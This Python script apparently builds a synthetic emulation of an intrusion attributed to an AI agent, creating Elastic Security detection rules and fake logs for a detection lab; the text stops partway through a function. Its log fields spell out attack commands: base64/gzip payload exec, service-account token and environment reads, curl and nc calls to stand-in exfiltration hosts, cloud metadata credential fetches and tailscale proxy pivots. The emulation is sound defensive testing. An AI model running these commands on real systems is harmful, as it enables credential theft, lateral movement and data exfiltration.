#!/usr/bin/env python3
"""
Run a safe, synthetic emulation of the public Hugging Face agent intrusion.

The runner creates ECS-aligned synthetic logs, custom Elastic Security rules,
generates alerts, and optionally runs Attack Discovery. It does not execute
exploit payloads or touch real Kubernetes, cloud, VPN, GitHub, or metadata
services.
"""

from __future__ import annotations

import argparse
import base64
import datetime as dt
import json
import os
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Any


CAMPAIGN_ID = "frontier-lab-agent-2026-emulation"
BASE_TAG = "frontier-lab-agent-emulation"
SOURCE_TAG = "hugging-face-inspired"

STREAMS = {
    "endpoint": "logs-frontier_lab_agent_emulation.endpoint-default",
    "k8s": "logs-frontier_lab_agent_emulation.kubernetes-default",
    "cloud": "logs-frontier_lab_agent_emulation.cloud-default",
    "github": "logs-frontier_lab_agent_emulation.github-default",
    "app": "logs-frontier_lab_agent_emulation.app-default",
}

class ApiError(RuntimeError):
    def __init__(self, method: str, url: str, status: int, payload: Any):
        super().__init__(f"{method} {url} failed with HTTP {status}: {payload}")
        self.method = method
        self.url = url
        self.status = status
        self.payload = payload


@dataclass
class Auth:
    header: str

    @staticmethod
    def from_args(args: argparse.Namespace) -> "Auth":
        api_key = args.api_key or os.getenv("ELASTIC_API_KEY")
        if api_key:
            return Auth(f"ApiKey {api_key}")

        username = args.username or os.getenv("ELASTIC_USERNAME")
        password = args.password or os.getenv("ELASTIC_PASSWORD")
        if username and password:
            encoded = base64.b64encode(f"{username}:{password}".encode()).decode()
            return Auth(f"Basic {encoded}")

        raise SystemExit(
            "Missing auth. Set ELASTIC_API_KEY, or set ELASTIC_USERNAME and "
            "ELASTIC_PASSWORD, or pass --api-key / --username / --password."
        )


class HttpClient:
    def __init__(self, base_url: str, auth: Auth, insecure: bool = False):
        self.base_url = base_url.rstrip("/")
        self.auth = auth
        self.context = ssl._create_unverified_context() if insecure else None

    def request(
        self,
        method: str,
        path: str,
        body: Any | None = None,
        content_type: str = "application/json",
        ok: tuple[int, ...] = (200, 201),
        timeout: int = 60,
    ) -> Any:
        url = self.base_url + path
        data = None
        if body is not None:
            if content_type == "application/x-ndjson":
                data = body.encode()
            else:
                data = json.dumps(body).encode()

        headers = {"Authorization": self.auth.header, "kbn-xsrf": "true"}
        if body is not None:
            headers["Content-Type"] = content_type

        request = urllib.request.Request(url, data=data, method=method, headers=headers)
        try:
            with urllib.request.urlopen(request, timeout=timeout, context=self.context) as response:
                raw = response.read().decode()
                if response.status not in ok:
                    raise ApiError(method, url, response.status, raw)
                if not raw:
                    return None
                try:
                    return json.loads(raw)
                except json.JSONDecodeError:
                    return raw
        except urllib.error.HTTPError as error:
            raw = error.read().decode(errors="replace")
            try:
                payload = json.loads(raw)
            except json.JSONDecodeError:
                payload = raw
            if error.code in ok:
                return payload
            raise ApiError(method, url, error.code, payload) from None


class KibanaClient(HttpClient):
    def __init__(self, base_url: str, auth: Auth, space: str, insecure: bool = False):
        super().__init__(base_url, auth, insecure)
        self.space = space

    def kpath(self, path: str) -> str:
        if self.space and self.space != "default":
            return f"/s/{urllib.parse.quote(self.space)}{path}"
        return path

    def request(self, method: str, path: str, **kwargs: Any) -> Any:  # type: ignore[override]
        return super().request(method, self.kpath(path), **kwargs)


def now_run_id() -> str:
    return dt.datetime.now(dt.timezone.utc).strftime("%Y%m%d%H%M%S")


def stream_meta(index: str) -> dict[str, str]:
    dataset = index[len("logs-") : -len("-default")]
    return {"type": "logs", "dataset": dataset, "namespace": "default"}


def mitre(tactic_id: str, tactic_name: str, technique_id: str, technique_name: str) -> list[dict[str, Any]]:
    return [
        {
            "framework": "MITRE ATT&CK",
            "tactic": {
                "id": tactic_id,
                "name": tactic_name,
                "reference": f"https://attack.mitre.org/tactics/{tactic_id}/",
            },
            "technique": [
                {
                    "id": technique_id,
                    "name": technique_name,
                    "reference": f"https://attack.mitre.org/techniques/{technique_id}/",
                }
            ],
        }
    ]


def build_rules(run_id: str, run_tag: str) -> list[dict[str, Any]]:
    base = {
        "type": "query",
        "enabled": False,
        "index": ["logs-frontier_lab_agent_emulation.*"],
        "language": "kuery",
        "interval": "1m",
        "from": "now-3h",
        "max_signals": 100,
        "tags": [BASE_TAG, SOURCE_TAG, "custom-agent-intrusion-scenario", "attack-discovery-seed", run_tag],
        "author": ["Cursor synthetic emulation"],
        "license": "Elastic License v2",
    }

    def rule(
        slug: str,
        name: str,
        phase: str,
        description: str,
        risk: int,
        severity: str,
        tactic_id: str,
        tactic_name: str,
        technique_id: str,
        technique_name: str,
    ) -> dict[str, Any]:
        return {
            **base,
            "rule_id": f"frontier-agent-emulation-{slug}-{run_id}",
            "name": name,
            "description": description,
            "risk_score": risk,
            "severity": severity,
            "query": (
                f'labels.campaign_id: "{CAMPAIGN_ID}" and '
                f'labels.run_id: "{run_id}" and labels.attack_phase: "{phase}"'
            ),
            "threat": mitre(tactic_id, tactic_name, technique_id, technique_name),
        }

    return [
        rule(
            "dataset-worker-foothold",
            "Dataset Worker Local File Disclosure via External Reference",
            "dataset_worker_foothold",
            "Detects synthetic dataset-worker local file disclosure markers involving environment and source paths.",
            73,
            "high",
            "TA0001",
            "Initial Access",
            "T1190",
            "Exploit Public-Facing Application",
        ),
        rule(
            "encoded-c2",
            "Python Gzip Base64 Payload Execution",
            "encoded_c2",
            "Detects synthetic Python execution patterns that resemble compressed and base64 staged payload execution.",
            78,
            "high",
            "TA0011",
            "Command and Control",
            "T1105",
            "Ingress Tool Transfer",
        ),
        rule(
            "linux-recon-secrets",
            "Linux Service Account Token and Environment Discovery",
            "linux_recon_secrets",
            "Detects synthetic Linux discovery commands involving process, environment, and service-account token paths.",
            68,
            "medium",
            "TA0007",
            "Discovery",
            "T1083",
            "File and Directory Discovery",
        ),
        rule(
            "k8s-token-rbac",
            "Kubernetes Service Account TokenRequest and RBAC Review",
            "k8s_token_rbac",
            "Detects synthetic Kubernetes TokenRequest and self-access review activity from a workload identity.",
            82,
            "high",
            "TA0007",
            "Discovery",
            "T1069",
            "Permission Groups Discovery",
        ),
        rule(
            "k8s-privileged-hostpath",
            "Kubernetes Privileged Pod Created With HostPath Mount",
            "k8s_privileged_hostpath",
            "Detects synthetic Kubernetes audit events for privileged pod creation with hostPath-style node access.",
            91,
            "critical",
            "TA0004",
            "Privilege Escalation",
            "T1611",
            "Escape to Host",
        ),
        rule(
            "cloud-iam-enumeration",
            "Cloud Metadata Credential Access Followed by IAM Enumeration",
            "cloud_iam_enumeration",
            "Detects synthetic cloud metadata access and follow-on identity, compute, registry, and secrets enumeration.",
            80,
            "high",
            "TA0006",
            "Credential Access",
            "T1552",
            "Unsecured Credentials",
        ),
        rule(
            "mesh-vpn-pivot",
            "Tailscale Userspace Networking Proxy Started",
            "mesh_vpn_pivot",
            "Detects synthetic Tailscale userspace networking, memory state, and SOCKS proxy pivot behavior.",
            84,
            "high",
            "TA0008",
            "Lateral Movement",
            "T1090",
            "Proxy",
        ),
        rule(
            "github-supply-chain",
            "GitHub App Installation Token Created and Repository Access",
            "github_supply_chain",
            "Detects synthetic GitHub App token minting followed by repository access, pull request, and CI probing activity.",
            86,
            "high",
            "TA0001",
            "Initial Access",
            "T1195",
            "Supply Chain Compromise",
        ),
        rule(
            "deaddrop-exfil",
            "Chunked Exfiltration to Public Dead-Drop Services",
            "deaddrop_exfiltration",
            "Detects synthetic chunked outbound staging to public request-capture, paste, dataset, and proxy destinations.",
            88,
            "high",
            "TA0010",
            "Exfiltration",
            "T1041",
            "Exfiltration Over C2 Channel",
        ),
    ]


def build_documents(run_id: str, run_tag: str) -> list[tuple[str, dict[str, Any]]]:
    # Rule trigger map for the synthetic sections below.
    #
    # Each event gets labels.attack_phase set to one of these values. If
    # --include-custom-rules is used, the generated custom rules match directly
    # on labels.run_id + labels.attack_phase. Without --include-custom-rules,
    # the same telemetry is shaped to exercise relevant OOTB Elastic content
    # when those SIEM rules / endpoint protections are installed and enabled.
    #
    # The page/README include the OOTB coverage checklist; the per-phase notes
    # below call out the closest rules for each synthetic section.
    #
    # dataset_worker_foothold
    #   Custom: Dataset Worker Local File Disclosure via External Reference
    #   OOTB: mostly source context for the broader attack chain; closest
    #         endpoint content is file/secret access and suspicious interpreter
    #         execution once follow-on commands begin.
    #
    # encoded_c2
    #   Custom: Python Gzip Base64 Payload Execution
    #   SIEM: Base64 Decoded Payload Piped to Interpreter; Payload Downloaded
    #         by Interpreter and Piped to Interpreter
    #   EDR: Linux Payload Decoded and Decrypted via Built-in Utility; Decoded
    #        Payload Piped to Interpreter; Suspicious Python Encoded Payload
    #        Execution; Payload Downloaded and Piped to Interpreter
    #
    # linux_recon_secrets
    #   Custom: Linux Service Account Token and Environment Discovery
    #   SIEM: Kubernetes and Cloud Credential Path Access via Process Arguments;
    #         Kubernetes Service Account Secret Access
    #   EDR: Multi Value Secret Searching via Find; Potential Linux Credential
    #        Dumping via Proc Filesystem
    #
    # k8s_token_rbac
    #   Custom: Kubernetes Service Account TokenRequest and RBAC Review
    #   SIEM: Kubernetes Pod Exec Sensitive File or Credential Path Access, plus
    #         Kubernetes audit/RBAC discovery coverage where available
    #
    # k8s_privileged_hostpath
    #   Custom: Kubernetes Privileged Pod Created With HostPath Mount
    #   SIEM: Kubernetes Privileged Pod Created; Kubernetes Pod Created with a
    #         Sensitive hostPath Volume
    #   EDR: Potential Cgroup Privilege Escalation Container Escape via Mount;
    #        Potential CVE-2025-32463 Sudo Chroot Execution Attempt
    #
    # cloud_iam_enumeration
    #   Custom: Cloud Metadata Credential Access Followed by IAM Enumeration
    #   SIEM: AWS Secrets Manager Rapid Secrets Retrieval; First Time Seen AWS
    #         Secret Value Accessed in Secrets Manager; AWS IAM API Calls via
    #         Temporary Session Tokens
    #
    # mesh_vpn_pivot
    #   Custom: Tailscale Userspace Networking Proxy Started
    #   SIEM: Linux Tunneling and Port Forwarding; Curl SOCKS Proxy Detected via
    #         Defend for Containers
    #   EDR: Potential Linux Tunneling and/or Port Forwarding; Potential Network
    #        Traffic Tunneling via Proxychains
    #
    # github_supply_chain
    #   Custom: GitHub App Installation Token Created and Repository Access
    #   SIEM: High Number of Repository Cloning by User; High Number of Closed
    #         Pull Requests by User
    #
    # deaddrop_exfiltration
    #   Custom: Chunked Exfiltration to Public Dead-Drop Services
    #   EDR: File Download from or Upload to Hosting Service
    base_time = dt.datetime.now(dt.timezone.utc) - dt.timedelta(minutes=70)
    docs: list[tuple[str, dict[str, Any]]] = []
    sequence = 0

    def timestamp(minutes: int) -> str:
        return (base_time + dt.timedelta(minutes=minutes)).isoformat().replace("+00:00", "Z")

    def add(kind: str, phase: str, minutes: int, **fields: Any) -> None:
        nonlocal sequence
        sequence += 1
        index = STREAMS[kind]
        doc: dict[str, Any] = {
            "@timestamp": timestamp(minutes),
            "data_stream": stream_meta(index),
            "labels": {
                "campaign_id": CAMPAIGN_ID,
                "run_id": run_id,
                "attack_phase": phase,
                "emulation": BASE_TAG,
                "run_tag": run_tag,
                "sequence": sequence,
                "kill_chain_day": fields.pop("kill_chain_day", "day3"),
            },
            "tags": [BASE_TAG, SOURCE_TAG, "custom-agent-intrusion-scenario", run_tag],
            "event": {"kind": "event", "outcome": "success"},
            "related": {
                "hosts": ["lab-dataset-worker-01", "lab-k8s-node-01"],
                "user": ["svc-dataset-worker"],
                "ip": ["198.51.100.23", "203.0.113.45", "10.42.7.19"],
            },
        }

        def merge(target: dict[str, Any], source: dict[str, Any]) -> None:
            for key, value in source.items():
                if isinstance(value, dict) and isinstance(target.get(key), dict):
                    merge(target[key], value)
                else:
                    target[key] = value

        merge(doc, fields)
        docs.append((index, doc))

    def proc(phase: str, minutes: int, host: str, user: str, command: str, message: str, parent: str = "python3") -> None:
        add(
            "endpoint",
            phase,
            minutes,
            event={"category": ["process"], "type": ["start"], "action": "process_start", "dataset": "endpoint.events.process"},
            host={"name": host, "ip": "10.42.7.19"},
            user={"name": user},
            process={
                "name": command.split()[0].split("/")[-1],
                "command_line": command,
                "parent": {"name": parent},
            },
            message=message,
        )

    def net(phase: str, minutes: int, host: str, domain: str, ip: str, port: int, url: str, message: str) -> None:
        add(
            "endpoint",
            phase,
            minutes,
            event={"category": ["network"], "type": ["connection"], "action": "connection_attempted", "dataset": "endpoint.events.network"},
            host={"name": host, "ip": "10.42.7.19"},
            user={"name": "svc-dataset-worker"},
            destination={"domain": domain, "ip": ip, "port": port},
            url={"full": url, "domain": domain},
            message=message,
        )

    add(
        "app",
        "dataset_worker_foothold",
        1,
        kill_chain_day="day1",
        event={"category": ["configuration"], "type": ["access"], "action": "dataset_config_processed", "dataset": "dataset.worker"},
        host={"name": "lab-dataset-worker-01", "ip": "10.42.7.19"},
        user={"name": "svc-dataset-worker"},
        file={"path": "/proc/self/environ"},
        lab={"dataset": {"name": "attacker/hdf5-raw-storage-probe", "config": "envu8"}},
        message="Synthetic dataset config processed HDF5 external raw storage pointing at /proc/self/environ.",
    )
    add(
        "app",
        "dataset_worker_foothold",
        3,
        kill_chain_day="day1",
        event={"category": ["configuration"], "type": ["access"], "action": "dataset_config_processed", "dataset": "dataset.worker"},
        host={"name": "lab-dataset-worker-01", "ip": "10.42.7.19"},
        user={"name": "svc-dataset-worker"},
        file={"path": "/src/services/worker/src/worker/main.py"},
        lab={"dataset": {"name": "attacker/hdf5-raw-storage-probe", "config": "mainu8"}},
        message="Synthetic dataset config disclosed worker source path for pipeline reconnaissance.",
    )
    add(
        "app",
        "dataset_worker_foothold",
        6,
        kill_chain_day="day1",
        event={"category": ["process"], "type": ["start"], "action": "template_renderer_execution", "dataset": "dataset.worker"},
        host={"name": "lab-dataset-worker-01", "ip": "10.42.7.19"},
        user={"name": "svc-dataset-worker"},
        process={"name": "python3", "command_line": "python3 worker/main.py --render reference://synthetic-jinja-offset"},
        message="Synthetic Jinja2 template-render execution marker; no exploit payload executed.",
    )

    proc(
        "encoded_c2",
        8,
        "lab-dataset-worker-01",
        "svc-dataset-worker",
        'python3 -c "import gzip,base64; exec(gzip.decompress(base64.b64decode(\\"SYNTHETIC_BLOB\\")))"',
        "Synthetic gzip/base64 staged Python execution from dataset worker.",
    )
    net("encoded_c2", 9, "lab-dataset-worker-01", "capture.frontier-emulation.invalid", "198.51.100.23", 443, "https://capture.frontier-emulation.invalid/campaign/queue", "Synthetic outbound poll to public request-capture style C2 queue.")
    net("encoded_c2", 11, "lab-dataset-worker-01", "paste.frontier-emulation.invalid", "198.51.100.24", 443, "https://paste.frontier-emulation.invalid/raw/stage2", "Synthetic second-stage loader fetch from paste-style service.")
    add(
        "app",
        "encoded_c2",
        12,
        event={"category": ["network"], "type": ["protocol"], "action": "dead_drop_commit", "dataset": "dataset.api"},
        host={"name": "lab-dataset-worker-01"},
        user={"name": "svc-dataset-worker"},
        lab={"dataset": {"name": "attacker/frontier-dead-drop", "branch": "chunks/day1"}},
        message="Synthetic gzipped command output committed to attacker-controlled dataset branch as dead-drop.",
    )

    for offset, command in enumerate(
        [
            "id",
            "env",
            "cat /proc/self/mountinfo",
            "ls -la /root /pkg /tmp",
            "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
            "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace",
            "getent hosts service-connector.internal.example",
        ]
    ):
        proc("linux_recon_secrets", 15 + offset, "lab-dataset-worker-01", "svc-dataset-worker", command, f"Synthetic Linux recon/secret enumeration command: {command}")

    kuser = "system:serviceaccount:lab-prod:svc-dataset-worker"
    add(
        "k8s",
        "k8s_token_rbac",
        25,
        event={"category": ["iam"], "type": ["access"], "action": "create_serviceaccount_token", "dataset": "kubernetes.audit"},
        kubernetes={
            "namespace": "kube-system",
            "audit": {
                "verb": "create",
                "requestURI": "/api/v1/namespaces/kube-system/serviceaccounts/ebs-csi-controller-sa/token",
                "user": {"username": kuser},
                "objectRef": {"resource": "serviceaccounts/token", "name": "ebs-csi-controller-sa", "namespace": "kube-system"},
            },
        },
        user={"name": kuser},
        message="Synthetic TokenRequest for CSI service account from compromised worker identity.",
    )
    add(
        "k8s",
        "k8s_token_rbac",
        27,
        event={"category": ["iam"], "type": ["access"], "action": "self_subject_rules_review", "dataset": "kubernetes.audit"},
        kubernetes={
            "namespace": "lab-prod",
            "audit": {
                "verb": "create",
                "requestURI": "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
                "user": {"username": kuser},
                "objectRef": {"resource": "selfsubjectrulesreviews", "apiGroup": "authorization.k8s.io"},
            },
        },
        user={"name": kuser},
        message="Synthetic SelfSubjectRulesReview to enumerate RBAC privileges.",
    )
    add(
        "k8s",
        "k8s_token_rbac",
        29,
        event={"category": ["configuration"], "type": ["access"], "action": "list_pods", "dataset": "kubernetes.audit"},
        kubernetes={"audit": {"verb": "list", "requestURI": "/api/v1/pods?limit=500", "user": {"username": kuser}, "objectRef": {"resource": "pods"}}},
        user={"name": kuser},
        message="Synthetic cluster-wide pod list from compromised service account.",
    )
    add(
        "k8s",
        "k8s_token_rbac",
        31,
        event={"category": ["configuration"], "type": ["access"], "action": "get_secrets", "dataset": "kubernetes.audit"},
        kubernetes={
            "namespace": "lab-prod",
            "audit": {
                "verb": "get",
                "requestURI": "/api/v1/namespaces/lab-prod/secrets/prod-worker-env",
                "user": {"username": kuser},
                "objectRef": {"resource": "secrets", "name": "prod-worker-env", "namespace": "lab-prod"},
            },
        },
        user={"name": kuser},
        message="Synthetic secret object read tied to worker environment credential exposure.",
    )
    add(
        "k8s",
        "k8s_privileged_hostpath",
        35,
        event={"category": ["configuration"], "type": ["creation"], "action": "create_privileged_pod", "dataset": "kubernetes.audit"},
        kubernetes={
            "namespace": "lab-prod",
            "audit": {
                "verb": "create",
                "requestURI": "/api/v1/namespaces/lab-prod/pods",
                "user": {"username": kuser},
                "objectRef": {"resource": "pods", "name": "lab-node-debug-synthetic", "namespace": "lab-prod"},
                "requestObject": {
                    "spec": {
                        "hostPID": True,
                        "hostNetwork": True,
                        "containers": [{"name": "debug", "securityContext": {"privileged": True}}],
                        "volumes": [{"name": "hostfs", "hostPath": {"path": "/"}}],
                    }
                },
            },
        },
        user={"name": kuser},
        host={"name": "lab-k8s-node-01", "ip": "10.42.8.10"},
        message="Synthetic privileged hostPath pod creation representing node pivot; no real pod was created.",
    )
    proc("k8s_privileged_hostpath", 37, "lab-k8s-node-01", "root", 'chroot /host /bin/sh -c "hostname; date; ls /var/lib/kubelet"', "Synthetic host filesystem inspection after privileged-pod style pivot.")

    aws_user = "arn:aws:sts::123456789012:assumed-role/frontier-node-role/i-0synthetic"
    for minutes, name, source, message in [
        (41, "GetCallerIdentity", "sts.amazonaws.com", "Synthetic STS identity validation from harvested node role."),
        (43, "DescribeVpcs", "ec2.amazonaws.com", "Synthetic VPC enumeration."),
        (45, "ListClusters", "eks.amazonaws.com", "Synthetic EKS cluster enumeration."),
        (47, "GetAuthorizationToken", "ecr.amazonaws.com", "Synthetic container registry token request."),
        (49, "ListSecrets", "secretsmanager.amazonaws.com", "Synthetic secrets inventory enumeration."),
    ]:
        add(
            "cloud",
            "cloud_iam_enumeration",
            minutes,
            event={"category": ["configuration"], "type": ["access"], "action": name, "dataset": "aws.cloudtrail", "provider": source},
            cloud={"provider": "aws", "account": {"id": "123456789012", "name": "frontier-prod-lab"}, "region": "us-west-2"},
            aws={"cloudtrail": {"event_name": name, "event_source": source, "user_identity": {"arn": aws_user, "type": "AssumedRole"}}},
            source={"ip": "203.0.113.45"},
            user={"name": aws_user},
            message=message,
        )
    net("cloud_iam_enumeration", 40, "lab-dataset-worker-01", "169.254.169.254", "169.254.169.254", 80, "http://169.254.169.254/latest/meta-data/iam/security-credentials/frontier-node-role", "Synthetic metadata credential retrieval marker using reserved lab telemetry only.")

    proc("mesh_vpn_pivot", 52, "lab-k8s-node-01", "root", "tailscaled --tun=userspace-networking --state=mem: --socket=/tmp/ts.sock --socks5-server=127.0.0.1:1055 --no-logs-no-support", "Synthetic mesh VPN daemon started in userspace networking mode.")
    proc("mesh_vpn_pivot", 53, "lab-k8s-node-01", "root", "tailscale --socket=/tmp/ts.sock up --auth-key=tskey-auth-FAKE-FRONTIER-EMULATION --hostname=frontier-sandbox-synthetic --accept-routes", "Synthetic mesh VPN enrollment with fake auth key.")
    net("mesh_vpn_pivot", 55, "lab-k8s-node-01", "source-connector.tailnet.invalid", "10.99.4.12", 443, "https://source-connector.tailnet.invalid/api/catalog", "Synthetic access to internal source-control connector over mesh VPN.")

    for minutes, action, message in [
        (58, "integration_installation_token.create", "Synthetic GitHub App installation token minted with contents/write and PR permissions."),
        (59, "repo.clone", "Synthetic private repository clone using short-lived app token."),
        (60, "repo.tree.list", "Synthetic repository tree enumeration for CI and benchmark markers."),
        (61, "pull_request.create", "Synthetic pull request opened to probe CI credential surface."),
        (62, "workflow_run.read", "Synthetic GitHub Actions read for CI context."),
    ]:
        add(
            "github",
            "github_supply_chain",
            minutes,
            event={"category": ["configuration"], "type": ["access"], "action": action, "dataset": "github.audit"},
            github={"actor": "lab-ci-bot", "org": "frontier-lab", "repo": "frontier-lab/internal-eval-harness", "app_id": "123456"},
            source={"ip": "203.0.113.45"},
            user={"name": "lab-ci-bot"},
            message=message,
        )

    for minutes, domain, url, message in [
        (64, "capture.frontier-emulation.invalid", "https://capture.frontier-emulation.invalid/exfil/chunk/001", "Synthetic chunked command output POST to request-capture style endpoint."),
        (65, "datasets.frontier-emulation.invalid", "https://datasets.frontier-emulation.invalid/attacker/frontier-dead-drop/commit/chunk-002", "Synthetic dead-drop dataset commit with compressed result chunk."),
        (66, "paste.frontier-emulation.invalid", "https://paste.frontier-emulation.invalid/put/chunk-003", "Synthetic paste-style exfil staging of encoded blob."),
        (67, "cors-proxy.frontier-emulation.invalid", "https://cors-proxy.frontier-emulation.invalid/proxy?target=filedrop.invalid/blob", "Synthetic CORS proxy relay used as alternate egress route."),
    ]:
        net("deaddrop_exfiltration", minutes, "lab-dataset-worker-01", domain, "198.51.100.50", 443, url, message)
        docs[-1][1]["labels"]["chunk_id"] = f"chunk-{minutes}"
        docs[-1][1]["threat"] = {"indicator": {"type": "url", "url": {"full": url}}}

    # Add density so Attack Discovery sees a campaign-like rhythm instead of a
    # sparse demo. These remain inert synthetic observations mapped to the same
    # nine alerting phases.
    for offset, path in enumerate(
        [
            "/proc/1/cgroup",
            "/proc/net/route",
            "/etc/resolv.conf",
            "/etc/hosts",
            "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
            "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
            "/src/services/worker/src/worker/start_worker_loop.py",
            "/tmp/submitted_code.c",
        ],
        start=1,
    ):
        add(
            "app",
            "dataset_worker_foothold",
            2 + offset,
            kill_chain_day="day1",
            event={"category": ["file"], "type": ["access"], "action": "synthetic_local_file_disclosure", "dataset": "dataset.worker"},
            host={"name": "lab-dataset-worker-01", "ip": "10.42.7.19"},
            user={"name": "svc-dataset-worker"},
            file={"path": path},
            lab={"dataset": {"name": "attacker/local-reader", "config": f"split-{offset:02d}"}},
            message=f"Synthetic dataset worker local file disclosure marker for {path}.",
        )

    for offset, command in enumerate(
        [
            "uname -a",
            "whoami",
            "pwd",
            "find / -maxdepth 2 -type f -name '*token*'",
            "python3 - <<'PY'\nimport os; print(sorted(os.environ))\nPY",
            "curl -sS https://capture.frontier-emulation.invalid/register",
            "nc -vz capture.frontier-emulation.invalid 443",
            "python3 /tmp/submitted_code.c",
            "python3 -c \"from urllib.request import urlopen; print(urlopen('https://paste.frontier-emulation.invalid/raw/loader').status)\"",
            "python3 -c \"import zlib,base64; print(base64.b64encode(zlib.compress(b'synthetic')))\"",
            "echo nameserver 8.8.8.8 > /tmp/synthetic-resolv.conf",
            "printf '198.51.100.24 paste.frontier-emulation.invalid\\n' >> /tmp/synthetic-hosts",
            "python3 -c \"import socket; socket.getaddrinfo=lambda *a,**k: []\"",
            "curl -sS https://datasets.frontier-emulation.invalid/api/datasets/attacker/frontier-dead-drop",
            "git clone https://fake-token@frontier-emulation.invalid/datasets/attacker/staging-repo",
            "python3 -c \"import gzip,base64; print('packed synthetic payload')\"",
        ],
        start=1,
    ):
        phase = "encoded_c2" if offset % 3 else "linux_recon_secrets"
        proc(phase, 7 + (offset % 12), "lab-dataset-worker-01", "svc-dataset-worker", command, f"Synthetic high-volume action stream command: {command}")

    for offset, request in enumerate(
        [
            ("/api/v1/namespaces/lab-prod/pods", "list", "pods"),
            ("/api/v1/namespaces/kube-system/pods", "list", "pods"),
            ("/apis/apps/v1/deployments", "list", "deployments"),
            ("/api/v1/namespaces/kube-system/configmaps", "list", "configmaps"),
            ("/api/v1/namespaces/lab-prod/secrets", "list", "secrets"),
            ("/apis/rbac.authorization.k8s.io/v1/clusterrolebindings", "list", "clusterrolebindings"),
            ("/api/v1/namespaces/kube-system/serviceaccounts/efs-csi-controller-sa/token", "create", "serviceaccounts/token"),
            ("/api/v1/namespaces/lab-prod/serviceaccounts/default/token", "create", "serviceaccounts/token"),
            ("/apis/authorization.k8s.io/v1/selfsubjectaccessreviews", "create", "selfsubjectaccessreviews"),
            ("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "create", "selfsubjectrulesreviews"),
            ("/api/v1/namespaces/lab-prod/secrets/mesh-auth-key", "get", "secrets"),
            ("/api/v1/namespaces/lab-prod/secrets/jwt-signing-key", "get", "secrets"),
        ],
        start=1,
    ):
        uri, verb, resource = request
        add(
            "k8s",
            "k8s_token_rbac",
            24 + (offset % 14),
            event={"category": ["configuration"], "type": ["access"], "action": f"kubernetes_{verb}_{resource}", "dataset": "kubernetes.audit"},
            kubernetes={"namespace": "lab-prod", "audit": {"verb": verb, "requestURI": uri, "user": {"username": kuser}, "objectRef": {"resource": resource, "namespace": "lab-prod"}}},
            user={"name": kuser},
            message=f"Synthetic Kubernetes {verb} request against {resource}: {uri}.",
        )

    for offset, pod_name in enumerate(
        [
            "lab-node-debug-a",
            "lab-node-debug-b",
            "lab-node-debug-c",
            "lab-node-debug-respawn-1",
            "lab-node-debug-respawn-2",
            "lab-node-debug-respawn-3",
        ],
        start=1,
    ):
        add(
            "k8s",
            "k8s_privileged_hostpath",
            34 + offset,
            event={"category": ["configuration"], "type": ["creation"], "action": "create_privileged_pod", "dataset": "kubernetes.audit"},
            kubernetes={"namespace": "lab-prod", "audit": {"verb": "create", "requestURI": "/api/v1/namespaces/lab-prod/pods", "user": {"username": kuser}, "objectRef": {"resource": "pods", "name": pod_name, "namespace": "lab-prod"}}},
            user={"name": kuser},
            host={"name": f"lab-k8s-node-{offset:02d}", "ip": f"10.42.8.{offset + 10}"},
            message=f"Synthetic self-respawning privileged hostPath pod marker: {pod_name}.",
        )

    for offset, name in enumerate(
        [
            "DescribeInstances",
            "DescribeSecurityGroups",
            "DescribeSubnets",
            "DescribeRouteTables",
            "DescribeTransitGateways",
            "ListSecrets",
            "GetSecretValue",
            "ListRoles",
            "ListAttachedRolePolicies",
            "DescribeRepositories",
        ],
        start=1,
    ):
        source = "ec2.amazonaws.com" if name.startswith("Describe") else "iam.amazonaws.com"
        if "Secret" in name:
            source = "secretsmanager.amazonaws.com"
        if "Repositories" in name:
            source = "ecr.amazonaws.com"
        add(
            "cloud",
            "cloud_iam_enumeration",
            39 + (offset % 13),
            event={"category": ["configuration"], "type": ["access"], "action": name, "dataset": "aws.cloudtrail", "provider": source},
            cloud={"provider": "aws", "account": {"id": "123456789012", "name": "frontier-prod-lab"}, "region": "us-west-2"},
            aws={"cloudtrail": {"event_name": name, "event_source": source, "user_identity": {"arn": aws_user, "type": "AssumedRole"}}},
            source={"ip": "203.0.113.45"},
            user={"name": aws_user},
            message=f"Synthetic cloud estate enumeration call: {name}.",
        )

    for offset, command in enumerate(
        [
            "tailscale --socket=/tmp/ts.sock status --json",
            "tailscale --socket=/tmp/ts.sock netcheck",
            "curl --socks5 127.0.0.1:1055 https://source-connector.tailnet.invalid/api/catalog",
            "dig @100.100.100.100 source-connector.tailnet.invalid",
            "curl --socks5 127.0.0.1:1055 https://ci.tailnet.invalid/health",
            "tailscale --socket=/tmp/ts.sock ping source-connector",
            "tailscale --socket=/tmp/ts.sock status",
            "curl --socks5 127.0.0.1:1055 https://git.tailnet.invalid/app/installations",
        ],
        start=1,
    ):
        proc("mesh_vpn_pivot", 51 + offset, "lab-k8s-node-01", "root", command, f"Synthetic mesh pivot command: {command}.")

    for offset, action in enumerate(
        [
            "integration_installation_token.create",
            "repo.clone",
            "repo.tree.list",
            "repo.contents.read",
            "repo.branch.create",
            "pull_request.create",
            "pull_request.update",
            "workflow_run.read",
            "actions.secret.list",
            "code_search.query",
        ],
        start=1,
    ):
        add(
            "github",
            "github_supply_chain",
            56 + offset,
            event={"category": ["configuration"], "type": ["access"], "action": action, "dataset": "github.audit"},
            github={"actor": "lab-ci-bot", "org": "frontier-lab", "repo": "frontier-lab/internal-eval-harness", "app_id": "123456"},
            source={"ip": "203.0.113.45"},
            user={"name": "lab-ci-bot"},
            message=f"Synthetic source-control supply-chain action: {action}.",
        )

    for offset in range(1, 17):
        domain = ["capture.frontier-emulation.invalid", "datasets.frontier-emulation.invalid", "paste.frontier-emulation.invalid", "filedrop.frontier-emulation.invalid"][offset % 4]
        url = f"https://{domain}/campaign/{run_id}/chunk/{offset:03d}"
        net(
            "deaddrop_exfiltration",
            61 + (offset % 8),
            "lab-dataset-worker-01",
            domain,
            "198.51.100.50",
            443,
            url,
            f"Synthetic chunked exfiltration envelope {offset:03d} with gzip/base64/XOR marker.",
        )
        docs[-1][1]["labels"]["chunk_id"] = f"chunk-{offset:03d}"
        docs[-1][1]["threat"] = {"indicator": {"type": "url", "url": {"full": url}}}

    return docs


def ensure_data_streams(es: HttpClient) -> None:
    for name in STREAMS.values():
        try:
            es.request("PUT", f"/_data_stream/{name}")
